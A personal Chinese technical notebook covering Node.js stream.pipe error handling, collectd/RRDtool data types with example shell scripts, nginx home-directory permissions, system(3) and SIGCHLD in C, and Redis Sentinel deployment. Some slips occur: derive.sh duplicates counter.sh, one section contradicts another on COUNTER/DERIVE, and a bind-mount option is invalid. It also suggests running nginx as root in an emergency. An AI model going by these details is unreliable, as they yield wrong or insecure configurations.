** 关键 API 文档

   [[https://nodejs.org/api/stream.html#stream_readable_pipe_destination_options][stream.pipe]] 文档
   #+begin_quote
   readable.pipe(destination[, options])#
   
     * destination Writable Stream The destination for writing data
     * options Object Pipe options
         + end Boolean End the writer when the reader ends. Default = true
   
   This method pulls all the data out of a readable stream, and writes it to the supplied
   destination, automatically managing the flow so that the destination is not overwhelmed
   by a fast readable stream.
   #+end_quote

   [[https://nodejs.org/api/fs.html#fs_fs_createreadstream_path_options][fs.createReadStream]] 文档
   #+begin_quote
   fs.createReadStream(path[, options])#
   
   Returns a new ReadStream object (See Readable Stream).
   
   Be aware that, unlike the default value set for highWaterMark on a readable stream (16
   kb), the stream returned by this method has a default value of 64 kb for the same
   parameter.
   
   options is an object or string with the following defaults:
   
   { flags: 'r',
     encoding: null,
     fd: null,
     mode: 0o666,
     autoClose: true
   }
   
   options can include start and end values to read a range of bytes from the file instead
   of the entire file. Both start and end are inclusive and start at 0. The encoding can be
   'utf8', 'ascii', or 'base64'.
   
   If fd is specified, ReadStream will ignore the path argument and will use the specified
   file descriptor. This means that no open event will be emitted.
   
   If autoClose is false, then the file descriptor won't be closed, even if there's an
   error. It is your responsibility to close it and make sure there's no file descriptor
   leak. If autoClose is set to true (default behavior), on error or end the file descriptor
   will be closed automatically.
   
   mode sets the file mode (permission and sticky bits), but only if the file was created.
   
   An example to read the last 10 bytes of a file which is 100 bytes long:
   
   fs.createReadStream('sample.txt', {start: 90, end: 99});
   
   If options is a string, then it specifies the encoding.
   #+end_quote
  
** stream.pipe 的工作原理
   
   stream.pipe 将可读流（Readable Stream）连接到可写流（Writable Stream），
   数据会从可读流传输到可写流，支持自动流量控制。

   上面的 stream.pipe 其实是调用的 Readable.pipe，其流程简述如下：

   - 监听可读流的 data 事件：将读取到的数据写入可写流，如果可写流缓冲区满，则暂停可读流。


   - 监听可写流的 drain 事件：实现自动流量控制。


   - 监听可写流的 unpipe 事件：取消所有事件监听。


   - 监听可写流的 close、finish 事件：调用可读流的 unpipe()，触发可写流的 unpipe 事件。

   
   - 监听可读流的 end 事件：调用可写流的 Writable.end()，触发可写流的 finish 事件。


   - 监听可写流的 error 事件：调用可读流的 unpipe()，触发可写流的 unpipe 事件，如果 error 事件没有其它人监听，则抛出为异常。


   - 在可写流上发出 pipe 事件。

   
   以上流程请自行阅读代码映证：[[https://github.com/nodejs/node/blob/v4.4.4/lib/_stream_readable.js#L460][node/_stream_readable.js at v4.4.4 · nodejs/node]]
   

** stream.pipe 的问题

   结合以上描述有以下疑问
   
   - 可读流出错会怎么样

     可读流发出 error、close 事件，但因为错误没有发出 end 事件。

     可读流可能被关闭，可写流不会被关闭，pipe 状态保持不变，数据流动停顿了。

     在现实情况中，或早或晚，可写流可能因为超时时间到等原因最终被关闭，从而转化为下面的情况。


   - 可写流出错会怎么样

     可写流发出 error、close 事件，没有 finish 事件。

     可读流会与可写流断开 pipe，可读流不会被关闭。

     可读流以 fs.ReadStream 为例，当它被读完时（EOF，发出 end 事件），根据 autoClose 标志（默认为 true），决定是否关闭流（释放文件句柄），没有读完就不会被关闭。

     以上逻辑是合理的，一个可读流可以与多个可写流通过 pipe 连在一起，没有理由因为一个可写流的问题影响到可读流的状态。

     做为开发人员，切莫幻想 node.js 的垃圾收集（ GC）会在可读流没有被引用时自动关闭文件句柄。

     当 node.js 将文件句柄以整数（Integer）方式表示时，就不可能实现垃圾收集时自动关闭文件句柄了。

   
   stream.pipe 没有魔法，它提供了一种传输数据的优美方式，但是它并不完美，在错误处理方面留下了很多空白，有待开发人员自行解决。

* DONE 理解 collectd 的四种数据类型                                :collectd:
  CLOSED: [2016-05-30 Mon 14:32]

** collectd 的基础是 [[http://oss.oetiker.ch/rrdtool/][RRDtool]]
    
   #+begin_quote
   RRDtool is the OpenSource industry standard, high performance data logging and graphing system for time series data.
   #+end_quote

   #+begin_quote
   What makes RRDtool so special?

   RRDtool is GNU licensed software developed by Tobias Oetiker, a system manager at the Swiss Federal Institute of Technology. Though it is a database, there are distinct differences between RRDtool databases and other databases as listed below:

  * RRDtool stores data; that makes it a back-end tool. The RRDtool command set allows one to create graphs; that makes it a front-end tool as well. Other databases just store data and can not create graphs.

  * In case of linear databases, new data gets appended at the bottom of the database table. Thus its size keeps on increasing, whereas the size of an RRDtool database is determined at creation time. Imagine an RRDtool database as the perimeter of a circle. Data is added along the perimeter. When new data reaches the starting point, it overwrites existing data. This way, the size of an RRDtool database always remains constant. The name "Round Robin" stems from this behavior.

  * Other databases store the values as supplied. RRDtool can be configured to calculate the rate of change from the previous to the current value and store this information instead.

  * Other databases get updated when values are supplied. The RRDtool database is structured in such a way that it needs data at predefined time intervals. If it does not get a new value during the interval, it stores an UNKNOWN value for that interval. So, when using the RRDtool database, it is imperative to use scripts that run at regular intervals to ensure a constant data flow to update the RRDtool database.
   #+end_quote

   #+begin_quote
   是什么让 RRDtool 如此特殊？

   RRDtool 是由 Tobias Oetiker 开发的遵循 GNU 协议的软件，他是 Swiss Federal Institute of Technology 的 system manager。虽然 RRDtool 是一个数据库，但与其它数据库有着明显的区别，如下所述：

  * RRDtool 存储数据，是后端工具。RRDtool 命令集可用于创建图表，因此它也是前端工具。其它数据库只存储数据但不创建图表。

  * 做为线性数据库，新数据追加在数据库的底部。这样它的尺寸会不断增长，然而 RRDtool 数据库的尺寸在创建时确定。想像 RRDtool 数据库是圆周长。数据随着周长添加。当新数据达到起始点，它会覆盖已存在的数据。这样，RRDtool 数据库的尺寸总是保持不变。因此得名“Round Robin”。

  * 其它数据库存储供应的数据值。而 RRDtool 可配置为计算前一个值到当前值的变化率，做为替代物进行存储。

  * 其它数据库在供应数据值时就会进行更新。RRDtool 数据库构造为需要预定义时间间隔的数据。在一个时间间隔内，如果它无法获取到一个新值，它会为该时间间隔存储一个未知（UNKNOWN） 值。因此，使用 RRDtool 数据库时，必须定期运行脚本确保恒定的数据流去更新 RRDtool 数据库。
   #+end_quote

   以上引用自 [[http://oss.oetiker.ch/rrdtool/tut/rrd-beginners.en.html][RRDtool - rrd-beginners]]

** collectd 的四种数据类型

   RRDtool 默认的时间间隔为 300 秒（5分钟），collectd 默认时间间隔为 10 秒。

   通常的建议是上报数据时，确保时间间隔与 collectd 服务器的设置一致（即 COLLECTD_INTERVAL），
   但是了解 collectd 会如何处理上报的值，更有利于我们正确地上报数据，获得理想的结果。

   collectd 用到了 RRDtool 中的四种数据类型：ABSOLUTE、COUNTER、DERIVE、GAUGE，《[[http://blog.kankanan.com/article/collectd-6570636e7c7b578b8be689e3.html][collectd 数据类型详解]]》 已有描述，而具体如何使用则看本文。

   假设要上报一个 100/秒 的统计值，在一个时间间隔（10 秒）内分成多部分上报，分别使用四种数据类型进行上报。

   =absolute.sh=
   #+begin_src sh
     #!/bin/bash

     HOSTNAME="${COLLECTD_HOSTNAME:-localhost}"
     VALUE=0

     while [ 1 ]; do
         sleep 3
         VALUE=200
         echo "PUTVAL \"$HOSTNAME/test/absolute\" N:$VALUE"
         sleep 1
         VALUE=100
         echo "PUTVAL \"$HOSTNAME/test/absolute\" N:$VALUE"
         sleep 6
         VALUE=700
         echo "PUTVAL \"$HOSTNAME/test/absolute\" N:$VALUE"
     done
   #+end_src

   =ABSOLUTE= 类型值的处理
   #+begin_quote
   将时间间隔（10 秒）内的上报的值进行累加，然后与时间间隔（10 秒）相除

   (200 + 100 + 700)/10 == 100
   #+end_quote

   =counter.sh=
   #+begin_src sh
     #!/bin/bash

     HOSTNAME="${COLLECTD_HOSTNAME:-localhost}"
     VALUE=0

     while [ 1 ]; do
         sleep 3
         VALUE=$[VALUE+500]
         echo "PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"
         sleep 1
         VALUE=$[VALUE+200]
         echo "PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"
         sleep 6
         VALUE=$[VALUE+300]
         echo "PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"
     done
   #+end_src

   =COUNTER= 类型值的处理
   #+begin_quote
   将时间间隔（10 秒）内的变化值（时间间隔内最后上报的值减去上一时间间隔最后上报的值）与时间间隔（10 秒）相除

   (2000 - 1000) / 10 == 100
   #+end_quote

   =derive.sh=
   #+begin_src sh
     #!/bin/bash

     HOSTNAME="${COLLECTD_HOSTNAME:-localhost}"
     VALUE=0

     while [ 1 ]; do
         sleep 3
         VALUE=$[VALUE+500]
         echo "PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"
         sleep 1
         VALUE=$[VALUE+200]
         echo "PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"
         sleep 6
         VALUE=$[VALUE+300]
         echo "PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"
     done
   #+end_src

   =DERIVE= 类型值的处理
   #+begin_quote
   将时间间隔（10 秒）内的变化值（时间间隔内最后上报的值减去上一时间间隔最后上报的值）与时间间隔（10 秒）相除

   (2000 - 1000) / 10 == 100
   #+end_quote

   =gauge.sh=
   #+begin_src sh
    #!/bin/bash

    HOSTNAME="${COLLECTD_HOSTNAME:-localhost}"
    VALUE=0

    while [ 1 ]; do
        sleep 8
        VALUE=50
        echo "PUTVAL \"$HOSTNAME/test/gauge\" N:$VALUE"
        sleep 2
        VALUE=300
        echo "PUTVAL \"$HOSTNAME/test/gauge\" N:$VALUE"
    done
   #+end_src

   =GAUGE= 类型值的处理
   #+begin_quote
   将时间间隔（10 秒）内的值乘以该值与上一值的时间间隔，再累加，最后与时间间隔（10 秒）相除

   ((50 * 8) + (300 * 2)) / 10 == 100
   #+end_quote


** =COUNTER= VS =DERIVE=

   这两者非常相似，不同点表现在当前上报的值小于上一上报值时：

   - =COUNTER= 认为数据发生了溢出，会进行”回绕“计算，只要在数据集定义的取值范围（Min-Max）内，仍会做为当前时间间隔（10 秒）的值。

     如生成统计值的程序或设备发生重启，而且重启时间小于一个时间间隔（10 秒），则有可能因”回绕“计算得出巨大的错误值。
  
     因此建议在 =COUNTER= 类型数据集上设置合理的取值范围，一方面支持”回绕“计算，另一方面又不受误计算的影响。

   - =DERIVE= 认为这是异常值，丢弃该值。


   =COUNTER= 和 =DERIVE= 类型的值与上一值紧密相关，需要减去上一值才是变化值。
   
** =ABSOLUTE= VS =GAUGE=

   =ABSOLUTE= 是变化值，而 =GAUGE= 变化率（数量/秒）。

   =ABSOLUTE= 需要将时间间隔（10 秒）内的值累加再除以时间间隔（10 秒）算出变化率（数量/秒）。

   =GAUGE= 还与当前值到上一值的时间间隔紧密相关，上一值到当前值的时间间隔内的变化率都为当前值。

   =COUNTER= 和 =DERIVE= 类型的值与上一值无关，本身就是变化值（或变化率）。

* DONE collectd 问题诊断方法                                       :collectd:
  CLOSED: [2016-05-30 Mon 16:27]

** 输出日志

   =collectd.conf=
   #+begin_example
     LoadPlugin "logfile"
     <Plugin "logfile">
       LogLevel "info"
       File "/var/log/collectd.log"
       Timestamp true
     </Plugin>
   #+end_example

   collectd-exec 插件执行的脚本标准错误输出（stderr）会出现在日志文件中（/var/log/collectd.log）。

   通过分析日志可以查出统计脚本本身的问题。

** 网络抓包

   使用 tcpdump 抓包
   #+begin_src sh
     tcpdump -i any host <collectd server ip> -XX -tttt -nnnn -s 0 -w ~/<collectd server ip>.pcap
   #+end_src
   请将 =<collectd server ip>= 替换为 collectd.conf 中 =network= 插件中的 =Server= 值。

   使用 wireshark 查看抓到的包，右键菜单中选择 =Decode As...= ，弹出的列表中选择按 =collectd= 协议进行解析。

   检查上报的数据是否有问题。

   如果上报的数据是正常的，则有可能是以前上报了有问题的数据导致，请尝试从 collectd 服务器上直接将相应的 rrd 文件删除。

** 分析 rrd 文件

   collectd 是使用 RRDtool 进行数据存储，直接查看 rrd 文件数据是最直接的诊断方法。

   #+begin_src sh
     rrdtool fetch /var/lib/collectd/localhost/test/gauge.rrd AVERAGE --start 1464585532 --end N
   #+end_src

   RRDtool 的用法请参考 [[http://oss.oetiker.ch/rrdtool/tut/rrdtutorial.en.html][RRDtool - rrdtutorial]]
   
* TODO 构建软件系统                                               :architecture:

  软件系统根据领域（domain）分为两种：

  - 在现实世界中能够找以参照物，也可以说是对现实世界建模

    
  - 在现实世界中没有对应物，也可以说是臆想的产物

* DONE 解决个人用户目录做为 Web 服务根目录的权限问题        :web:linux:nginx:
  CLOSED: [2016-06-14 Tue 13:38]

  我们在个人帐号目录下进行日常的开发工作，通常使用弱权限帐号（如：nobody）运行 Web 服务器（如：nginx）。

  nginx 配置 Web 服务器的根目录为个人用户目录，这样修改代码后刷新浏览器就可以看到效果。

  #+begin_example
    user nobody;

    server {
       listen       80;
       server_name  www.example.com;

       location / {
           root   /home/tangxinfa/projects/www.example.com;
           index  index.html index.htm;
       }
    }
  #+end_example
  
  然而 linux 的用户权限系统禁止 Web 服务器用户（nobody）访问个人用户（tangxinfa）的数据。

  使用浏览器访问，会得到一个错误页面
  #+begin_example
    403 Forbidden
  #+end_example

  使用 linux 命令确认问题是由用户权限系统引起
  #+begin_example
    $ sudo -u nobody -g nobody ls -la /home/tangxinfa/projects/www.example.com
    ls: cannot access '/home/tangxinfa/projects/www.example.com': Permission denied
  #+end_example


  解决方法有以下几种：

- 使用软链接

  很多人都会下意识地想到通过软链接来解决
  #+begin_example
    sudo ln -s /home/tangxinfa/projects/www.example.com /var/www/
    sudo chown -R nobody:nobody /var/www/www.example.com
    sudo chown -R nobody:nobody /home/tangxinfa/projects/www.example.com
  #+end_example
  将个人用户目录链到 Web 服务器用户目录下是没有用的，linux 按原始路径（/home/tangxinfa/projects/www.example.com）来检查权限。

  可以反过来，将项目从个人用户目录移到 Web 服务器用户目录下，然后反向建一个软链接，即可以让 Web 服务器工作正常，又不影响日常开发。

  #+begin_example
    sudo mv /home/tangxinfa/projects/www.example.com /var/www/
    ln -s /var/www/www.example.com /home/tangxinfa/projects/
  #+end_example

  但是，如果项目是版本控制系统（如：git）仓库的一个子项目（目录），将目录变成软链接后 git 会认为目录被删除了。


- 用户目录给 Web 服务帐号开放权限

  按 linux 的帐号权限系统要求，修改（chmod）用户目录的属性，每一级目录的权限都要修改，容易过渡放开权限，引入安全问题。
  
  设置 Web 服务帐号为用户帐号

  #+begin_example
    user tangxinfa;
  #+end_example

  由于 Web 服务器（nginx）通常配有多个服务，Web 服务帐号是全局共用的，其它服务的目录权限也要进行调整。
  如果 nginx 只运行这一个服务的话，还是可行的。

  设置 Web 服务帐号为 root 帐号

  #+begin_example
    user root;
  #+end_example

  使用 root 帐号会引入安全隐患，一般不推荐，但很少会遇到目录权限方面的问题，可以应急使用。


- 将用户目录挂载到 Web 帐号目录下

  mount 命令支持将一个目录重新挂载到其它位置

  #+begin_src sh
    sudo mkdir /var/www/www.example.com
    sudo chown nobody:nobody /var/www/www.example.com
    sudo mount --bind -o ro,username=nobody /home/tangxinfa/projects/www.example.com /var/www/www.example.com
  #+end_src

  Web 服务器和日常开发可以兼顾，两全其美的方案。

  bind 形式的挂载放到 /etc/fstab 会挂载失败（估计是挂载时相关依赖还没有准备好），影响开机。

  创建挂载脚本 /usr/sbin/bind-mounts 并添加可执行权限，内容如下
  #+begin_src sh
    #!/bin/bash

    mount --bind -o ro,username=nobody /home/tangxinfa/projects/www.example.com /var/www/www.example.com
  #+end_src

  创建 systemd 服务文件 /usr/lib/systemd/system/bind-mounts.service
  #+begin_example
    [Unit]
    Description=Bind Mounts
    After=local-fs.target

    [Service]
    Type=simple
    ExecStart=/usr/sbin/bind-mounts

    [Install]
    WantedBy=multi-user.target
  #+end_example

  启用 bind-mounts 服务
  #+begin_src sh
    sudo systemctl enable bind-mounts
  #+end_src

* TODO 理解 CORS                                              :web:cors:http:

  CORS（Cross-Origin Resource Sharing），即跨源资源共享。

** 客户端请求


** 服务器端响应


** 参考
   
   - [[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS][HTTP访问控制(CORS)]]

* DONE system(3) 与 SIGCHLD 信号                                    :linux:c:
  CLOSED: [2016-07-28 Thu 11:44]

  system(3) 常用于执行 shell 命令

  #+begin_src c
    #include <stdlib.h>
    #include <stdio.h>


    int main(int argc, char *argv[])
    {
        int ret = system("ls -la");
        printf("ret: %d\n", ret);
        return ret;
    }
  #+end_src

  正常情况下，命令执行成功会返回 0。

  system(3) 在执行的命令结束时会发出 SIGCHLD 信号，收到 SIGCHLD 信号的线程会从系统调用（如：read，write）中断返回，errno 为 EINTR（4: Interrupted system call）。
  
  应用程序应该重试被中断的系统调用，但很多时候是通过第三方库间接进行系统调用，而这些库并未考虑周到，误以为系统调用失败。

  另外还有信号标志 SA_RESTART ，用于自动重试被中断的系统调用，考虑到它只支持部分系统调用，而且我用到的平台不支持这一标志，所以不作考虑。

  那么该如何避免 SIGCHLD 信号中断系统调用呢？


  根据 system(3) 函数的 [[http://man7.org/tlpi/code/online/dist/procexec/system.c.html][源码]] ，其关键逻辑如下：

  - 保存信号掩码

  - 设置信号掩码为阻塞（SIG_BLOCK） SIGCHLD 信号

  - fork(3)

    + 子进程

      重置为保存的信号掩码，然后 execl(3)

    + 父进程

      等待子进程（waitpid(3)）结束，重置为保存的信号掩码
       
  子进程结束时操作系统会给父进程发送 SIGCHLD 信号，父进程会遍历（通常从主线程找起）一个不阻塞 SIGCHLD 的线程进行处理。


** 在整个应用中忽略 SIGCHLD 信号会导致获取不到子进程退出码

   在应用程序最开始的时候（main 函数），添加以下语句
  
   #+begin_src c
     signal(SIGCHLD, SIG_IGN);
   #+end_src
    
   子线程会继承主线程的信号处理，也就不会导致系统调用被中断。
   signal(3) 设置的是整个进程的信号处理，由所有线程共享，千万不要以为子线程继承设置后就跟主线程没有关系了，
   只有程序中有代码动了 SIGCHLD 的处置方式，所有线程都会受影响。

   然而，它会导致 system(3) 总是返回 -1，errno 为 ECHILD（10: No child processes），无法判断命令执行是否成功。
  
   [[http://stackoverflow.com/a/25039605/802708][c - system() function while SIGCHLD is ignored - Stack Overflow]] 或 man wait(2)
   #+begin_quote
   POSIX.1-2001 指明，如果将 SIGCHLD 置为 SIG_IGN，或者为 SIGCHLD 指定 SA_NOCLDWAIT 标志（见 sigaction(2)），子进程结束后将不会成为僵尸进程，调用 wait() 或 waitpid() 将阻塞到所有子进程结束后返回错误，errno 设置为 ECHILD。

   POSIX.1-2001 specifies that if the disposition of SIGCHLD is set to SIG_IGN or the SA_NOCLDWAIT flag is set for SIGCHLD (see sigaction(2)), then children that terminate do not become zombies and a call to wait() or waitpid() will block until all children have terminated, and then fail with errno set to ECHILD.
   #+end_quote

   [[https://www.win.tue.nl/~aeb/linux/lk/lk-5.html][The Linux kernel: Signals]]
   #+begin_quote
   If the parent is not interested it can say so explicitly (before the fork) using

    signal(SIGCHLD, SIG_IGN);

   or

    struct sigaction act;
    act.sa_handler = something;
    act.sa_flags = SA_NOCLDWAIT;
    sigaction (SIGCHLD, &act, NULL);

and as a result it will not hear about deceased children, and children will not be transformed into zombies. Note that the default action for SIGCHLD is to ignore this signal; nevertheless signal(SIGCHLD, SIG_IGN) has effect, namely that of preventing the transformation of children into zombies. In this situation, if the parent does a wait(), this call will return only when all children have exited, and then returns -1 with errno set to ECHILD.
   #+end_quote

   system(3) 调用 waitpid(3) 时，子进程已经被系统自动回收，消失得无影无踪，也就取不到子进程的返回值。

*** 使用 popen(3)/pclose(3) 来代替 system(3) 通过分析标准输出来判断命令执行是否成功

    #+begin_src c
      int system2(const char* command, char* output, size_t output_size)
      {
          FILE* p = popen(command, "r");
          if (p) {
              memset(output, '\0', output_size);
              fread(output, output_size - 1, 1, p);
              pclose(p);
              return 0;
          }

          return -1;
      }
    #+end_src

    使用示例

    #+begin_src C
      char output[255];
      if (0 == system2("mkdir /test; echo ret=$?", output, sizeof(output)) && strstr(output, "ret=0")) {
          printf("mkdir /test successed");
      } else {
          printf("mkdir /test failed");
      }
    #+end_src

** 在整个应用中阻塞 SIGCHLD 信号可能导致出现僵尸进程

   signal(3) 无法阻塞一个信号，只支持忽略（SIG_IGN）和恢复缺省处理（SIG_DFL）。

   阻塞（ SIG_BLOCK）和取消阻塞（SIG_UNBLOCK）用于信号掩码（Signal Mask），如 sigprocmask(3) ，多线程下请使用 pthread_sigmask(3)。

   主线程在创建子线程之前阻塞 SIGCHLD 信号
  
   #+begin_src c
     sigset_t set;
     sigemptyset(&set);
     sigaddset(&set, SIGCHLD);
     pthread_sigmask(SIG_BLOCK, &set, NULL);
   #+end_src
  
   通过继承主线程的信号处理，子线程调用 system(3) 创建子进程时能够保证其中的 waitpid(3) 调用成功获取子进程的退出码。

   man signal(7)
   #+begin_quote
   通过 fork(2) 创建的子进程继承父进程的信号掩码，该信号掩码即使在 execve(2) 后仍得以保留。

   A child created via fork(2) inherits a copy of its parent's signal mask; the signal mask is preserved across execve(2).
   #+end_quote

   system(3) 在替换进程为新程序（execl(3)）之前，会重置为保存的信号掩码，也就是阻塞 SIGCHLD 信号状态，子进程继承这一掩码可能会产生问题。

*** 在整个应用中阻塞 SIGCHLD 信号会导致一种常用的回收僵尸进程的方法失效

    [[http://www.microhowto.info/howto/reap_zombie_processes_using_a_sigchld_handler.html][Reap zombie processes using a SIGCHLD handler]] 有详细描述

    #+begin_quote
    The method described here has two steps:

    1. Define a handler for SIGCHLD that calls waitpid.

    2. Register the SIGCHLD handler.
    #+end_quote

    这种回收僵尸进程的方法不但我们自已不能使用，并且我们调用的子进程也不能使用，除非子进程聪明到先清除 SIGCHLD 信号掩码。

    相关 BUG 报告
    [[https://bugzilla.mindrot.org/show_bug.cgi?id=271][271 – SSHD should unblock SIGCHLD - POSIX signal blocks survive exec()]]

    通过 system(3) 启动 sshd，有用户尝试登录，sshd 会再 fork(3) 一个孙进程，然后在 SIGCHLD 信号处理函数中通过 waitpid(3) 回收孙进程，但是从父进程（调用 system(3)的进程）继承而来信号掩码阻塞了 SIGCHLD 信号，导致孙进程结束后成为僵尸进程。

*** 在调用 system(3) 前暂时取消对 SIGCHLD 的阻塞

    #+begin_src C
      // 封装 system(3) ，一方面避免中断系统调用，另一方面避免出现僵尸孙进程.
      // 请记得全局堵塞 SIGCHLD 信号.
      int system2(const char* command)
      {
          // 调用 system(3) 前取消对 SIGCHLD 的阻塞
          sigset_t set;
          sigemptyset(&set);
          sigaddset(&set, SIGCHLD);
          pthread_sigmask(SIG_UNBLOCK, &set, NULL);

          int code = system(command);

          // 调用 system(3) 后恢复对 SIGCHLD 的阻塞
          sigemptyset(&set);
          sigaddset(&set, SIGCHLD);
          pthread_sigmask(SIG_BLOCK, &set, NULL);

          return code;
      }
    #+end_src

    在调用 system(3) 前暂时取消对 SIGCHLD 的阻塞，使子进程继承到正确的信号掩码，调用返回后恢复对 SIGCHLD 的阻塞，可以解决这个问题。

    另外还有 popen(3)/pclose(3) 也可以用来创建子进程，也要相应进行替换。

** 进程的信号处理状态可在 proc 文件系统看到

   如进程 pid 为 5526 ，获取到的进程忽略的信号发下

   #+begin_example
     # grep SigIgn /proc/5526/status
     SigIgn: 0000000000001004
   #+end_example

   这是十六进制掩码，转化为二进制
    
   #+begin_example
     $ node -e 'console.log((0x0000000000001004).toString(2))'
     1000000000100
   #+end_example

   表示信号 3（SIGQUIT） 和 信号 13 （SIGPIPE）被屏蔽。

** 参考

   - [[http://www.linuxprogrammingblog.com/all-about-linux-signals?page=show][All about Linux signals | Linux Programming Blog]]

   
   - [[https://www.win.tue.nl/~aeb/linux/lk/lk-5.html][The Linux kernel: Signals]]


   - [[http://www.oschina.net/question/54100_30293][Linux下调用system()函数导致的问题 - 开源中国社区]]

* TODO Redis 双机房部署                                         :redis:linux:

** 简化的核心模型

   - User

     + resources :: 用户拥有的资源列表，即 resource_id 列表

   - Resource

     + resource_id :: 资源 ID


     + user_id :: 所属用户的 ID，可以不属于任何用户（user_id == 0）

     
     resource 为预先批量创建。

** 简化的核心操作

   - get_resources :: user 获取自已拥有的 resource 列表


   - get_resource :: user 获取自已拥有的指定 resource_id 对应的 resource


   - set_resource_user :: 设置 resource 的 user_id

        如果 resource 当前归其它 user 所有，则操作失败

        user_id == 0 则表示用户放弃 resource

** Redis 双机房部署

   采用 Master-Master 以同时使用双机房的资源。

   数据空间做纵向切分，Master 1 在机房 1，Master 2 在机房 2，互做 Slave 备份。

   - 数据切分方案

     + 按 resource_id 进行切分

       同一 user 的多个 resource 可能位于不同的机房，get_resources 可以从 Slave 获取其它机房的 resource。

       用户将 set_resource_user_id 请求发往机房 1 ，但是 resource 在机房 2 上，需要将请求转发到机房 2。

       是走外部接口（http）？是 HTTP 302 跳转让客户端重新发往新机房，还是HTTP 代理？
       
       或者走内部接口（redis pub/sub）？redis pub/sub 跨机房可行吗？

     + 按 user_id 进行切分

       由于 resource 的 user_id 可能随时变动，资源可能在两个房机间浮动，一个 set_resource_user_id 操作需要同时两个机房参与，以维持数据一致性。

       跨机房状态一致性如何保证？性能如何保证？

   - 故障切换方案

     机房故障时，另一机房的 Salve 切为 Master。

     + 机房 1（或 2） 完全不写机房 2（或 1） 的 Master。

     + 机房 2（或 1） 跨机房连接机房 1（或 2） 的 Master 写 Redis。

* TODO dynomite 简介                                                  :redis:

  [[https://github.com/Netflix/dynomite][Dynomite]] 是 [[http://netflix.com][Netflix]] 对亚马逊分布式存储引擎 [[http://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf][Dynamo]] 的一个开源通用实现。

  #+begin_quote
  Dynomite, inspired by Dynamo whitepaper, is a thin, distributed dynamo layer for different storage engines and protocols.
  Currently these include Redis and Memcached.
  Dynomite supports multi-datacenter replication and is designed for high availability. 
  #+end_quote

** 多数据中心复制

** 数据一致性保证
   
   [[https://github.com/Netflix/dynomite/wiki/Consistency][Consistency · Netflix/dynomite Wiki]]

* DONE Redis Sentinel 多机房部署注意事项                              :redis:
  CLOSED: [2016-08-15 Mon 15:03]

** 级连同步失效

   级连同步的描述（摘自 [[http://redis.io/topics/replication][Replication – Redis]]）：
   #+begin_quote
   Slaves are able to accept connections from other slaves. Aside from connecting a
   number of slaves to the same master, slaves can also be connected to other slaves in
   a cascading-like structure.
   #+end_quote
    
   由此可见级连同步可减轻 Master 的流量。

   假设 DataCenter 2 上的两个 Slave 从 DataCenter 1 上的 Master 进行同步，会导致 DataCenter 1 要流出两份流量到 DataCenter 2，开启级连同步（DataCenter 2 上的其中一个 Slave 从另一个 Slave 上进行同步）后，DataCenter 1 只需同步一份流量到 DataCenter2。

   Sentinel 以星状组织 Redis 结点，无法发现二级 Slave（Slave 上连接的其它 Slave），也就无法将二级 Slave 信息提供给客户端应用进行访问，应用需要自行连上二级 Slave。另外，一级 Slave 被 Sentinel 切为 Master 后，二级 Slave 将转化为一级 Slave ，从而被 Sentinel 发现。

   [[file:../static/redis-sentinel_slave_of_slave.png]]

   当 Fail-Over 发生后级连同步会失效，Redis Sentinel 不支持级连同步
   #+begin_quote
   Aside from this problems, there is also the problem that for Sentinel
   the role of an instance is the one published in INFO by the instance.
   This means that you can't failover a slave that happens to be the
   master of other chained instances. Also the chained instances will not
   be detected, and if detected because of a temporary role change for
   some reason, they'll be reconfigured to replicate with what Sentinel
   believe to be the master.
   Basically you can find your ways to make it working but currently the
   support for chained replication in Sentinel is near zero.

   Salvatore 
   #+end_quote
   引用自 [[https://groups.google.com/d/msg/redis-db/uMOIX3m3Is4/HWhYegU4OawJ][Sentinels in Multi Region configuration - Google 网上论坛]]

** 内网流量外网化

   跨机房部署就意味着需要跨机房同步或访问 Redis 数据，如果另一机房有多个 Slave，则会有多份流量，机房外网流量会相应增长，需要预先进行流量规划。


   Redis 为内网部署提供了如下配置项

   - Sentinel 的 announce-ip 和 announce-port 选项
     
     要求 Redis 版本至少为 2.8，参见 [[https://raw.githubusercontent.com/antirez/redis/2.8/redis.conf][redis.conf]]

   - Redis 的 slave-announce-ip 和 slave-announce-port 选项

     要求 Redis 版本至少为 3.2，参见 [[https://raw.githubusercontent.com/antirez/redis/3.2/redis.conf][redis.conf]]

   它们用于解决如下两个问题
   #+begin_quote
   Remapping ports and addresses creates issues with Sentinel in two ways:

    1. Sentinel auto-discovery of other Sentinels no longer works, since it is based on 
       hello messages where each Sentinel announce at which port and IP address they are
       listening for connection. However Sentinels have no way to understand that an address
       or port is remapped, so it is announcing an information that is not correct for other
       Sentinels to connect.
    2. Slaves are listed in the INFO output of a Redis master in a similar way: the address
       is detected by the master checking the remote peer of the TCP connection, while the
       port is advertised by the slave itself during the handshake, however the port may be
       wrong for the same reason as exposed in point 1.
   #+end_quote
   引用自 [[http://redis.io/topics/sentinel#sentinel-docker-nat-and-possible-issues][Redis Sentinel Documentation – Redis - Sentinel, Docker, NAT, and possible issues]]


   基于 Sentinel 的集群系统中，Redis 实例（角色可能为 Master、Slave 或 Sentinel）是通过 IP 和 PORT 标识的。

   - Master
     
     自身监听的 IP 和 PORT 并不重要，只要 Slave 和 Sentinel 能够连上即可，所以往往在所有 IP 上进行监听。

   
   - Slave

     Slave 配置中指定的 Master 结点 IP 是关键所在。

     Slave 建立到 Master 的 TCP 连接时，Master 获取到的对端 IP 和 PORT 标识该 Slave，在 Master 的 INFO 命令中体现。

     Slave 连接的 Master IP，经由路由规则，也就决定了 Master 看到的是 Slave 的哪一个 IP。

     可以通过 slave-announce-ip 和 slave-announce-port 配置项强制指定。

   - Sentinel

     Sentinel 配置中指定的 Master 结点 IP 是关键所在。

     Sentinel 建立到 Master 的 TCP 连接后，调用 =getsockname= 从 fd 中取得本地 IP，PORT 则为配置的监听端口，并通过 PUBLISH Hello 消息告知其它 Sentinel。

     Sentinel 连接的 Master IP，经由路由规则，也就决定了 Sentinel 看到的自身 IP。

     可以通过 announce-ip 和 announce-port 配置项强制指定。

